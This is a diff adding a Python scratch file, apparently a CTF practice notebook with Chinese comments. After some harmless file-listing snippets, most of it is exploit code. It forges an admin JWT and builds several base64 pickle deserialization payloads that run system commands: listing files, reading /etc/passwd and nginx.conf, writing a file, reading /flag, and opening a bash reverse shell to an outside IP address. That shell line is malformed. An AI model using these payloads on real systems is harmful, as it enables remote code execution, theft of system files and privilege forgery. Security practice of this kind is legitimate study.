@@ -1,0 +1,184 @@
+#1.打开文件并且，每六个进行换行
+
+# import os
+#
+# count = 0
+# files = os.listdir(r'C:\Users\xiao\Desktop')
+# for i in files:
+#     count = count + 1
+#     if count % 5 == 0:
+#         print("\n")
+#     print(files)
+
+
+# import os
+#
+# count = 0
+# files = os.listdir(r'C:\Users\xiao\Desktop')
+# for file in files:
+#     file_path = os.path.join(r'C:\Users\xiao\Desktop', file)  # 拼接成完整的文件或文件夹路径
+#     if os.path.isfile(file_path):  # 判断是否是文件
+#         count += 1
+#         print(file, end=' ')
+#         if count % 6 == 0:
+#             print()
+#
+#
+# #-----------------------------------------------------------------
+#
+# #2.模糊查找文件
+#
+# import os
+#
+# files = os.listdir(r'C:\Users\xiao\Desktop')
+#
+# for file in files:
+#     if ('php' in file and 'ping' in file) or file.endswith('.txt'):
+#         print(file)
+#         print('C:\\Users\\xiao\Desktop\\'+file)
+#
+#
+# #----------------------------------------------------------------
+
+
+
+# import jwt
+# from datetime import datetime, timedelta, timezone
+#
+# # 构造 payload，这里手动设置角色为 admin
+# payload = {
+#     "sub": "test_admin",
+#     "role": "admin",
+#     "exp": datetime.now(timezone.utc) + timedelta(hours=1)
+# }
+#
+# # 使用与原应用相同的算法（HS256）和随便给定一个secret_key（因为验证关闭了，这里其实不影响结果，但按流程写上）
+# token = jwt.encode(payload, "test_secret_key", algorithm="HS256")
+# print(token)
+
+#---------
+
+# import pickle
+# import base64
+# import os
+#
+# class EvilObject:
+#     def __reduce__(self):
+#         # 这里指定要执行的恶意命令，例如执行系统命令 "ls"，可以替换成更恶意的命令如反向 shell 相关命令等
+#         command = "ls"
+#         return (os.system, (command,))
+#
+# # 创建恶意对象实例
+# evil_obj = EvilObject()
+# # 进行 pickle 序列化
+# serialized_data = pickle.dumps(evil_obj)
+# # 对序列化后的数据进行 base64 编码，以符合应用中先 base64 解码的要求
+# encoded_data = base64.b64encode(serialized_data).decode('utf-8')
+#
+# print(encoded_data)
+#
+#
+#
+# try:
+#     decoded_content = base64.b64decode(content)
+#     note_data = pickle.loads(decoded_content)
+# except pickle.UnpicklingError as e:
+#     print(f"Pickle 反序列化出错: {e}")
+#     with open(__file__, 'r') as file:
+#         note_data = file.read()
+# except base64.binascii.Error as e:
+#     print(f"Base64 解码出错: {e}")
+#     with open(__file__, 'r') as file:
+#     note_data = file.read()
+#
+#
+
+
+# import pickle
+# import base64
+# import os
+#
+# class EvilObject:
+#     def __reduce__(self):
+#         # 这里构造一个查看当前目录文件列表的命令，你可以替换成更恶意的命令，比如反弹 shell 命令等
+#         command = "ls -l"
+#         return (os.system, (command,))
+#
+# evil_obj = EvilObject()
+# serialized_data = pickle.dumps(evil_obj)
+# encoded_data = base64.b64encode(serialized_data).decode('utf-8')
+# print(encoded_data)
+
+# import pickle
+# import base64
+# import subprocess
+#
+# class EvilFileReadObject:
+#     def __reduce__(self):
+#         # 使用 subprocess 模块来执行命令读取文件内容
+#         command = "cat /etc/passwd"
+#         return (subprocess.check_output, (command.split(),))
+#
+# evil_obj = EvilFileReadObject()
+# serialized_data = pickle.dumps(evil_obj)
+# encoded_data = base64.b64encode(serialized_data).decode('utf-8')
+# print(encoded_data)
+
+# import pickle
+# import base64
+# import os
+#
+# class EvilWriteObject:
+#     def __reduce__(self):
+#         # 构造命令往当前目录写入一个名为 test.txt 的文件，内容为 "This is a test"
+#         command = "echo 'This is a test' > test.txt"
+#         return (os.system, (command,))
+#
+# evil_obj = EvilWriteObject()
+# serialized_data = pickle.dumps(evil_obj)
+# encoded_data = base64.b64encode(serialized_data).decode('utf-8')
+# print(encoded_data)
+
+# import pickle
+# import base64
+# import subprocess
+#
+# class EvilShellObject:
+#     def __reduce__(self):
+#         # 构造反弹 shell 命令，这里的 IP 和端口替换成你实际用于监听的攻击者 IP 和端口
+#         command = "bash -i >& /dev/tcp/http://27.25.151.237/http:/32001 0>&1"
+#         return (subprocess.check_output, (command.split(),))
+#
+# evil_obj = EvilShellObject()
+# serialized_data = pickle.dumps(evil_obj)
+# encoded_data = base64.b64encode(serialized_data).decode('utf-8')
+# print(encoded_data)
+
+# import pickle
+# import base64
+# import subprocess
+#
+# class EvilFileReadObject:
+#     def __reduce__(self):
+#         command = "cat /etc/nginx/nginx.conf"
+#         return (subprocess.check_output, (command.split(),))
+#
+# evil_obj = EvilFileReadObject()
+# serialized_data = pickle.dumps(evil_obj)
+# encoded_data = base64.b64encode(serialized_data).decode('utf-8')
+# print(encoded_data)
+
+import pickle
+import base64
+import subprocess
+
+class EvilFileReadObject:
+    def __reduce__(self):
+        # 使用 subprocess 模块来执行命令读取文件内容
+        command = "cat /flag"
+        return (subprocess.check_output, (command.split(),))
+
+evil_obj = EvilFileReadObject()
+serialized_data = pickle.dumps(evil_obj)
+encoded_data = base64.b64encode(serialized_data).decode('utf-8')
+print(encoded_data)
